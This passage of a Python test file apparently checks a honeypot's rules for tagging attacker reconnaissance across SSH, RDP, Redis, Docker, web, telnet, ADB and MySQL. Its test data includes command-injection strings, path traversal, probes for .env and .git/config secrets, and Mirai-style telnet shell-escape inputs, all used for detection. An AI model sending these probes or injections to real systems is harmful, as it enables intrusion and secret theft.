        ALL.tag_event("command", "ssh", {"input": big})
        ALL.tag_event("command", "ssh", {"input": nasty + "; uname " + big})
        ALL.tag_event("http_request", "web", {"path": nasty, "query": big, "user_agent": nasty})
        ALL.tag_event("http_request", "web", {"path": "/" + "../" * 50_000})
    assert time.perf_counter() - start < 2.0
    assert glob_match("*a*a*a*a*a*a*a*c", "a" * 4096) is False  # classic backtracking trap


def test_rdp_flags_end_to_end() -> None:
    assert ALL.tag_event(
        "disconnect", "rdp", {"flags": ["rdp_ntlm", "weak_password_match", "bluekeep_probe"]}
    ) == ["bluekeep", "weak-credentials"]
    assert ALL.tag_event("disconnect", "rdp", {"flags": ["rdp_ntlm", "null_session"]}) == []
    assert ALL.tag_event(
        "login_attempt", "rdp", {"method": "rdp-nla-off", "username": "evil", "password": "x"}
    ) == ["rdp-cleartext"]
    # An attacker-chosen username cannot forge a tag.
    assert ALL.tag_event("login_attempt", "rdp", {"username": "bluekeep_probe"}) == []


# ---- reconnaissance coverage (service-probe, iot-shell-probe, flag-based web probes) ----------


def _leaves(cond: Cond, negated: bool = False) -> Iterator[tuple[Leaf, bool]]:
    if isinstance(cond, Leaf):
        yield cond, negated
    else:
        for child in cond.children:
            yield from _leaves(child, negated or cond.kind == "not")


def test_web_app_probe_flags_agree_with_the_scanner_allowlist() -> None:
    """A research scanner that only probes must stay benign: every flag that makes the rule fire
    is one the benign allowlist accepts, and no flag it excludes is on that list."""
    leaves = list(_leaves(BY_ID["web-app-probe"].when))
    probe = {f for leaf, neg in leaves if not neg and leaf.field == "data.flags" for f in leaf.arg}
    excluded = {f for leaf, neg in leaves if neg and leaf.field == "data.flags" for f in leaf.arg}
    assert probe
    assert excluded
    assert probe <= SAFE_FLAGS, probe - SAFE_FLAGS
    assert excluded.isdisjoint(SAFE_FLAGS), excluded & SAFE_FLAGS


def web_get(path: str, *flags: str) -> Case:
    return ("http_request", "web", {"method": "GET", "path": path, "flags": list(flags)})


OBSERVED: list[tuple[Case, list[str]]] = [
    # redis: service fingerprinting
    (("command", "redis", {"command": "INFO", "input": "INFO", "flags": []}), ["service-probe"]),
    (
        ("command", "redis", {"command": "CONFIG", "input": "CONFIG GET *", "flags": []}),
        ["service-probe"],
    ),
    (("command", "redis", {"command": "FOO", "input": "FOO", "flags": ["unknown_command"]}), []),
    # docker API
    (
        ("http_request", "docker", {"method": "GET", "path": "/version", "flags": ["recon"]}),
        ["service-probe"],
    ),
    (
        ("http_request", "docker", {"method": "GET", "path": "/_ping", "flags": []}),
        ["service-probe"],
    ),
    (("http_request", "docker", {"method": "GET", "path": "/", "flags": []}), []),
    # web: a homepage, favicon or robots.txt visit stays untagged
    (web_get("/"), []),
    (web_get("/favicon.ico"), []),
    (web_get("/robots.txt"), []),
    (web_get("/wp-json/", "wordpress"), ["service-probe"]),
    (web_get("/phpinfo.php", "phpinfo_probe"), ["service-probe"]),
    (web_get("/info.php", "phpinfo_probe"), ["service-probe"]),
    (web_get("/.env", "config_leak", "recon_dotfile"), ["env-file-probe"]),
    (web_get("/.env.local", "config_leak", "recon_dotfile"), ["env-file-probe"]),
    (web_get("/.git/config", "config_leak", "recon_dotfile"), ["env-file-probe"]),
    (web_get("/admin/config.php", "config_leak"), ["env-file-probe"]),
    # telnet: the generic IoT shell-escape sequence names no family
    (("command", "telnet", {"input": "enable"}), ["iot-shell-probe"]),
    (("command", "telnet", {"input": "linuxshell"}), ["iot-shell-probe"]),
    (("command", "telnet", {"input": "ping; sh"}), ["iot-shell-probe"]),
    (
        ("command", "telnet", {"input": "/bin/busybox cat /proc/self/exe || cat /proc/self/exe"}),
        ["iot-shell-probe"],
    ),
    (("command", "telnet", {"input": "/bin/busybox QXWFTRBN"}), ["iot-shell-probe"]),
    (("command", "telnet", {"input": "/bin/busybox ECCHI"}), ["iot-shell-probe", "mirai"]),
    (("command", "ssh", {"input": "sh"}), []),
    # adb
    (("command", "adb", {"input": "getprop ro.product.model", "flags": ["adb_shell"]}), ["recon"]),
    (("command", "adb", {"input": "screencap -p", "flags": ["adb_shell"]}), ["recon"]),
    # mysql
    (
        ("command", "mysql", {"input": "select @@version_comment limit 1", "flags": []}),
        ["service-probe"],
    ),
    (("command", "mysql", {"input": "SET NAMES utf8mb4", "flags": []}), []),
]


@pytest.mark.parametrize(("case", "tags"), OBSERVED)
def test_observed_reconnaissance_is_tagged(case: Case, tags: list[str]) -> None:
    assert ALL.tag_event(*case) == tags


def test_iot_shell_probe_never_names_a_family_or_an_exploit() -> None:
    """The escape sequence is shared by many loaders: only the specific Mirai tokens add mirai."""
    for line in ("enable", "system", "shell", "sh", "linuxshell", "/bin/busybox QXWFTRBN"):
        tags = ALL.tag_event("command", "telnet", {"input": line})
        assert tags == ["iot-shell-probe"], (line, tags)
